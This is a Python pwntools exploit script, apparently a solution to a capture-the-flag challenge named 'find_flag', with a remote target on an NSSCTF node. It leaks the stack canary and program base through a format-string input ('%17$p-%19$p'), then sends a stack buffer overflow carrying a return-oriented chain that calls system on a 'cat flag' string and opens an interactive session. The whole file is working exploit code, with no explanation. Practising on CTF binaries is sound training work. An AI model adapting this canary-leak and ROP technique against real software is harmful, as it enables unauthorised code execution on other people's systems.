#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 1
os_level = 64
binary_name = 'find_flag'
remote_addr, port = 'node4.anna.nssctf.cn:28877'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    sla('name? ',str('%17$p-%19$p'))
    ru(b', ')
    canary, base = rl().strip(b'!\n').split(b'-')
    canary = int(canary, 16)
    base = int(base, 16) - 0x146F
    show('canary--> ' + hex(canary))
    show('base--> ' + hex(base))
    system = elf.symbols['system'] + base
    cat_flag = base + 0x2004
    ret = base + 0x101a
    prdi = base + 0x14e3
    payload = b'a'*(0x40-len(p64(canary))) + p64(canary) + b'a'*0x8 + p64(ret) + p64(prdi) + p64(cat_flag) + p64(system)
    sla(b'else? ',payload)
    flag = rl().strip()
    show('flag--> ' + str(flag))
    p.interactive()
